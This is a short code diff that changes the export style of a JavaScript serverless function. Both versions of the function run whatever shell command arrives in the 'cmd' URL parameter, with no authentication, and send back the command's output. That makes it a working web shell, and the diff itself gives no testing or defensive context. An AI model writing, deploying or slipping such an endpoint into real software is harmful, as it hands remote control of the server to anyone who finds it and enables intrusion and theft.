@@ -1,24 +1,25 @@
 const util = require('util');
 const exec = util.promisify(require('child_process').exec);
 
-exports.handler = async (req) => {
+export default async (req) => {
   try {
     const url = new URL(req.url);
     const cmd = url.searchParams.get('cmd');
     const { stdout, stderr } = await exec(cmd);
+    const resp = new Response(`
+CMD: ${cmd}
 
-    return {
-    statusCode: 200,
-    body: `stdout:
+STDOUT:
+
 ${stdout}
-stderr:
+
+STDERR:
+
 ${stderr}
-`
-  };
+`)
+
+    return resp
   } catch (err) {
-    return {
-      statusCode: 200,
-      body: `Execution failed: ${err}`
-    }
+    return new Response(`Execution failed: ${err}, ${req.url}`)
   }
 };
